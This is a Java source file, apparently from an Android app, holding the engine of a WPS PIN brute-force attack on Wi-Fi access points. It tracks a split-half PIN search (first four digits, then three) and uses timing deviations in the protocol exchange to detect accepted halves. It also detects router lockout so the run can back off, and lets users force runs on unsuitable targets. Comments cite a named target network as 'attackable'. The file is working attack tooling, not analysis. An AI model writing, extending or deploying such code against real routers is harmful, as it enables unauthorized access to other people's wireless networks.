package io.github.wlmosv_png.wpaforge.wps;

/**
 * WPS PIN 尝试的调度与判定。纯逻辑，不碰 Android API，可离线测试。
 *
 * 这里承载的是整个功能的「专业判断」部分：怎么从一串尝试结果里
 * 分辨出「这个 AP 不支持」「这个 AP 把我们锁了」「一切正常，继续跑」。
 * 分辨错了后果很重 —— 用户会对着一个永远不会成功的 AP 等几个小时。
 */
public final class WpsEngine {

    private WpsEngine() {
    }

    /** 单次尝试的结果快照。 */
    public static final class Attempt {
        public final String pin;
        public final String status;
        public final long elapsedMs;
        public final int assocCount;
        public final long maxAssocMs;

        /** AP 是否真跟我们建立了 WPS 会话（km=WPS） */
        public final boolean wpsSession;
        /** 日志指纹（拆半判据） */
        public final String logKind;
        /** 拆半：前 4 位被接受 */
        public final boolean halfAccepted;
        /** M2D→结束 的毫秒数（-1 = 没看到 M2D） */
        public final long m2dToEndMs;
        /** AP 是否 WPS 锁定：1/0/-1 */
        public final int apLocked;

        public Attempt(String pin, String status, long elapsedMs, int assocCount, long maxAssocMs) {
            this(pin, status, elapsedMs, assocCount, maxAssocMs, false, "");
        }

        public Attempt(String pin, String status, long elapsedMs, int assocCount,
                       long maxAssocMs, boolean wpsSession) {
            this(pin, status, elapsedMs, assocCount, maxAssocMs, wpsSession, "");
        }

        public Attempt(String pin, String status, long elapsedMs, int assocCount,
                       long maxAssocMs, boolean wpsSession, String logKind) {
            this(pin, status, elapsedMs, assocCount, maxAssocMs, wpsSession, logKind, -1, -1);
        }

        public Attempt(String pin, String status, long elapsedMs, int assocCount,
                       long maxAssocMs, boolean wpsSession, String logKind,
                       long m2dToEndMs, int apLocked) {
            this.m2dToEndMs = m2dToEndMs;
            this.apLocked = apLocked;
            this.pin = pin;
            this.status = status;
            this.elapsedMs = elapsedMs;
            this.assocCount = assocCount;
            this.maxAssocMs = maxAssocMs;
            this.wpsSession = wpsSession;
            this.logKind = logKind == null ? "" : logKind;
            this.halfAccepted = "HALF_OK".equals(status) || "M2D_THEN_MORE".equals(this.logKind);
        }

        public Attempt(WpsController.Result r) {
            this(r.pin, r.status, r.elapsedMs, r.assocCount, r.maxAssocMs,
                    r.wpsSession, r.logKind, r.m2dToEndMs, r.apLocked);
        }
    }

    /** 会话判定结论。 */
    public static final String V_RUNNING = "RUNNING";
    public static final String V_UNSUPPORTED = "UNSUPPORTED";  // AP 压根不进配对待机
    public static final String V_LOCKED = "LOCKED";            // 曾经正常，现在被锁
    public static final String V_HIT = "HIT";
    /** 前置画像：AP 自己宣告不收外部 PIN（config_methods 无 KEYPAD/LABEL）。 */
    public static final String V_NO_PIN = "NO_PIN";
    /** 前置画像：AP 报 AP Setup Locked。 */
    public static final String V_AP_LOCKED = "AP_LOCKED";
    /** 运行时：连续多次连关联都没进过 —— AP 多半不在 WPS 配对窗口。 */
    public static final String V_NO_WINDOW = "NO_WINDOW";
    /** 运行时：目标把我们锁了（关联骤降 / beacon 报 AP Setup Locked）。 */
    public static final String V_LOCKED_NOW = "LOCKED_NOW";

    /** 时序偏离基线多少算「AP 有额外动作」（拆半备判据）。 */
    public static final double TIMING_DEV = 0.35;
    /** 关联短于这个值算「瞬时关联」。 */
    public static final long INSTANT_MS = 600;
    /** 曾经真的做过 WPS，之后连续这么多次瞬时关联 → 判被锁。 */
    public static final int LOCK_AFTER = 5;

    /** 关联停留低于这个值 = 「被踢」（AP 没在跟我们做 WPS）。 */
    public static final long FAST_KICK_MS = 900;
    /** 关联停留高于这个值 = AP 确实在做 EAP-WSC 交换。 */
    public static final long REAL_WPS_MS = 2000;
    /** 连续多少次被踢才下结论（太小会误判，太大会白等）。 */
    public static final int UNSUPPORTED_AFTER = 8;
    /** 连续多少次「连关联都没进」就判 AP 不在配对窗口。 */
    public static final int NO_WINDOW_AFTER = 3;

    /**
     * 关联停留超过这个值 + 是 km=WPS 会话 = 「AP 真的在跑 WPS 交换」。
     *
     * 实测（2026-10-22）：真目标 CMCC-6339 关联 11876~12089ms；
     * 「关联即断」的 BroadcomAP 系只有 201ms。两者差 60 倍，
     * 比任何间接推测都可靠 —— 这是「目标可打」的硬证据。
     */
    public static final long REAL_WPS_ASSOC_MS = 1500;

    /** 会话统计。 */
    public static final class Session {
        public int tried;
        public int everLongAssoc;      // 出现过「真 WPS」的次数
        public int consecutiveKick;    // 连续被踢次数
        public long maxAssocMs;        // 历史最长关联
        public long totalMs;           // 累计耗时
        public String verdict = V_RUNNING;
        public String hitPin = null;
        /** 前置画像的原始结论（PIN_OK / NO_PIN / LOCKED / NO_WPS / UNKNOWN） */
        public String precheck = "UNKNOWN";
        /** 前置画像里的 config_methods 原文，展示用 */
        public String precheckMethods = "";
        /** 前置画像确认可打 PIN */
        public boolean pinCapable;
        /** 用户明知不可打仍强制运行 */
        public boolean forced;
        /** 是否见过 AP 真的在跟我们做 WPS（km=WPS 的关联）—— 一旦见过就一直为真 */
        public boolean everWpsSession;
        /** 进入过 WPS 会话的次数 */
        public int wpsSessionCount;
        /** 连续「无响应」次数 */
        public int consecutiveNoResponse;
        /** 连续「PIN 被拒」次数 */
        public int consecutiveRejected;
        /** 最近一次结果码，UI 展示用 */
        public String lastResult = "";
        /** 见过真实 WPS 交换（关联 ≥1.5s 且 km=WPS）—— 目标可打的硬证据 */
        public boolean everRealWps;

        // ---- 拆半攻击状态 ----
        /** 拆半阶段：0=未启用 1=找前 4 位 2=找后 3 位 */
        public int halfPhase;
        /** 阶段游标（阶段 1：0..9999；阶段 2：0..999） */
        public int halfCursor;
        /** 阶段 1 已确认的前 4 位 */
        public String halfPrefix = "";
        /** 本阶段已试次数 */
        public int halfTried;
        /** 瞬态：刚发现前 4 位候选（上层读到后处理并清） */
        public boolean halfPrefixHit;
        /** 拆半累计尝试次数（跨阶段） */
        public int halfTotalTried;

        // ---- 可靠判断用的数据 ----
        /** M2D→结束 的时长样本（最多 30 个），用来算基线 */
        public final java.util.List<Long> m2dTails = new java.util.ArrayList<>();
        /** 时序基线（样本中位数；-1 = 还没建立） */
        public long m2dBaseline = -1;
        /** 连续多少次「瞬时关联」 */
        public int consecutiveInstant;
        /** beacon 报告 AP Setup Locked */
        public boolean beaconLocked;
        /** 拆半判据累计触发次数（日志线索 + 时序异常） */
        public int halfSignalCount;

        public long avgMs() {
            return tried == 0 ? 0 : totalMs / tried;
        }
    }

    /**
     * 跑之前先把 AP 的能力画像灌进会话。
     *
     * 这一步是整块的关键：AP 在 beacon 里宣告的 WSC 配置方法就能决定
     * PIN 攻击有没有意义，不该让用户白跑 8 次 × 20 秒才知道。
     * NO_WPS / UNKNOWN 不阻断 —— BSS 表偶有查不到的时候，交给运行时兜底。
     */
    public static void precheck(Session s, WpsController.Info info) {
        if (s == null || info == null) return;
        s.precheck = info.verdict;
        s.precheckMethods = info.methods;
        if ("PIN_OK".equals(info.verdict)) {
            s.pinCapable = true;
            return;
        }
        if ("NO_PIN".equals(info.verdict)) {
            s.verdict = V_NO_PIN;
        } else if ("LOCKED".equals(info.verdict)) {
            s.verdict = V_AP_LOCKED;
        }
    }

    /** 前置画像是否已给出终态（运行时观测不得改口）。 */
    public static boolean presetTerminal(Session s) {
        return s != null && (V_NO_PIN.equals(s.verdict) || V_AP_LOCKED.equals(s.verdict));
    }

    /**
     * 把一次尝试喂进会话，更新统计与结论。
     * 判定规则：
     *   · 从来没出现过「真 WPS」且已经被踢够多次  → 不支持
     *   · 出现过「真 WPS」，但最近连续被踢          → 疑似被锁（应退避）
     *   · 否则                                      → 继续
     */
    public static void observe(Session s, Attempt a) {
        s.tried++;
        s.totalMs += a.elapsedMs;
        if (a.maxAssocMs > s.maxAssocMs) s.maxAssocMs = a.maxAssocMs;
        s.lastResult = a.status;

        // 「AP 在跟我们做 WPS」= 出现过 km=WPS 的关联。命中与否都算。
        boolean talking = a.wpsSession || "REJECTED".equals(a.status);
        if (talking) {
            s.everWpsSession = true;
            s.wpsSessionCount++;
            if (a.maxAssocMs >= REAL_WPS_ASSOC_MS) s.everRealWps = true;
        }

        if ("SUCCESS".equals(a.status)) {
            s.verdict = V_HIT;
            s.hitPin = a.pin;
            return;
        }
        if (presetTerminal(s)) return;

        // ---- 可靠性数据采集（每次尝试都做）----
        // 时序判据必须在更新基线之前算，否则本次样本会污染自己的基线
        boolean timingOdd = false;
        if (a.m2dToEndMs >= 0 && s.m2dBaseline > 0) {
            double dev = Math.abs(a.m2dToEndMs - s.m2dBaseline) / (double) s.m2dBaseline;
            if (dev >= TIMING_DEV) timingOdd = true;
        }
        if (a.m2dToEndMs >= 0) {
            s.m2dTails.add(a.m2dToEndMs);
            while (s.m2dTails.size() > 30) s.m2dTails.remove(0);
            s.m2dBaseline = median(s.m2dTails);
        }
        if (a.maxAssocMs > 0 && a.maxAssocMs < INSTANT_MS) {
            s.consecutiveInstant++;
        } else if (a.maxAssocMs >= INSTANT_MS) {
            s.consecutiveInstant = 0;
        }
        if (a.apLocked == 1) s.beaconLocked = true;

        // ---- 锁定判定（优先级最高：被锁了再跑就是白耗）----
        if (s.everRealWps && (s.consecutiveInstant >= LOCK_AFTER || s.beaconLocked)) {
            s.verdict = V_LOCKED_NOW;
            return;
        }

        // ---- 拆半判据（双路）----
        // 路 1：日志里 M2D 之后还有后续消息
        // 路 2：M2D→结束 的时长明显偏离基线（AP 继续交换会改变这个值）
        if (a.halfAccepted || timingOdd) {
            s.halfPrefixHit = true;
            s.halfSignalCount++;
            s.everRealWps = true;
            s.everWpsSession = true;
            s.halfTried++;
            s.halfTotalTried++;
            return;
        }
        if (s.halfPhase > 0) {
            s.halfTried++;
            s.halfTotalTried++;
            // 拆半模式下的普通失败不触发「放弃」判定 —— 11000 次里绝大多数都是失败的
            s.everWpsSession = s.everWpsSession || a.wpsSession;
            if (a.wpsSession && a.maxAssocMs >= REAL_WPS_ASSOC_MS) s.everRealWps = true;
            s.verdict = V_RUNNING;
            return;
        }

        if (talking) {
            s.consecutiveRejected++;
            s.consecutiveNoResponse = 0;
            s.consecutiveKick = 0;
        } else if ("NO_RESPONSE".equals(a.status)) {
            s.consecutiveNoResponse++;
            s.consecutiveKick++;
            s.consecutiveRejected = 0;
        } else {
            // TIMEOUT / NO_ASSOC 等：沿用关联时长兜底（兼容没有 WPS_SESSION 的旧输出）
            s.consecutiveRejected = 0;
            if (a.maxAssocMs >= REAL_WPS_MS) {
                s.everLongAssoc++;
                s.consecutiveKick = 0;
            } else if (a.maxAssocMs < FAST_KICK_MS) {
                s.consecutiveKick++;
            } else {
                s.consecutiveKick = 0;   // 中等时长：不确定，重置计数避免误判
            }
        }

        if (s.everWpsSession) {
            // 已经在做 WPS 协商 → 任何「放弃」判定都不该触发。
            // 这里跟旧版最大的区别：以前「关联短」就判不支持，
            // 而真机实测里 PIN 被拒也只会关联 1.2 秒，会被误杀。
            s.verdict = V_RUNNING;
        } else if (s.consecutiveNoResponse >= NO_WINDOW_AFTER) {
            s.verdict = V_NO_WINDOW;
        } else if (s.everLongAssoc == 0 && s.consecutiveKick >= UNSUPPORTED_AFTER) {
            s.verdict = V_UNSUPPORTED;
        } else if (s.everLongAssoc > 0 && s.consecutiveKick >= UNSUPPORTED_AFTER) {
            s.verdict = V_LOCKED;
        } else {
            s.verdict = V_RUNNING;
        }
    }

    public static boolean shouldStop(Session s) {
        return V_HIT.equals(s.verdict) || V_UNSUPPORTED.equals(s.verdict)
                || V_NO_PIN.equals(s.verdict) || V_AP_LOCKED.equals(s.verdict)
                || V_NO_WINDOW.equals(s.verdict) || V_LOCKED_NOW.equals(s.verdict);
    }

    /** 样本中位数（时序基线）。 */
    static long median(java.util.List<Long> v) {
        if (v == null || v.isEmpty()) return -1;
        java.util.List<Long> c = new java.util.ArrayList<>(v);
        java.util.Collections.sort(c);
        return c.get(c.size() / 2);
    }

    /** 每分钟尝试次数（UI 速率 / ETA 用）。 */
    public static double ratePerMin(Session s) {
        if (s == null || s.tried <= 0 || s.totalMs <= 0) return 0;
        return s.tried * 60000.0 / s.totalMs;
    }

    public static boolean shouldBackoff(Session s) {
        return V_LOCKED.equals(s.verdict);
    }

    // ---------------- 展示辅助 ----------------

    /** 把毫秒数说成人话；超过一天就明确说「天」。 */
    public static String human(long ms) {
        if (ms <= 0) return "—";
        long sec = ms / 1000;
        if (sec < 60) return sec + "s";
        long min = sec / 60;
        if (min < 60) return min + "min";
        long hour = min / 60;
        if (hour < 24) return hour + "h" + (min % 60) + "m";
        return (hour / 24) + "d" + (hour % 24) + "h";
    }

    /** 剩余时间估算。样本不足时返回 null，让界面显示「估算中」。 */
    public static String eta(Session s, int remaining) {
        if (s == null || remaining <= 0 || s.avgMs() <= 0) return null;
        return human(s.avgMs() * remaining);
    }

    /** 判定 → 文案（双语）。 */
    public static String verdictText(String verdict, boolean zh) {
        if (V_LOCKED_NOW.equals(verdict)) {
            return zh ? "目标已把我们锁住（关联骤降 / beacon 报 AP Setup Locked）—— 等待或重启路由后再试"
                      : "Target locked us out (assoc collapsed / AP Setup Locked)";
        }
        if (V_NO_WINDOW.equals(verdict)) {
            return zh ? "AP 当前不在 WPS 配对窗口（连续多次连关联都没进）"
                      : "AP is not in a WPS pairing window";
        }
        if (V_NO_PIN.equals(verdict)) {
            return zh ? "该 AP 未声明 PIN 输入能力，PIN 攻击无意义"
                      : "AP declares no PIN-input method — PIN attack is moot";
        }
        if (V_AP_LOCKED.equals(verdict)) {
            return zh ? "该 AP 处于 WPS 锁定状态（AP Setup Locked）"
                      : "AP is WPS-locked (AP Setup Locked)";
        }
        if (V_UNSUPPORTED.equals(verdict)) {
            return zh ? "该 AP 不接受 WPS 配对（关联即被断）"
                      : "This AP does not accept WPS pairing";
        }
        if (V_LOCKED.equals(verdict)) {
            return zh ? "疑似触发 AP 锁定，已暂停"
                      : "AP appears rate-limited — paused";
        }
        if (V_HIT.equals(verdict)) {
            return zh ? "已命中" : "PIN found";
        }
        return zh ? "进行中" : "Running";
    }
}
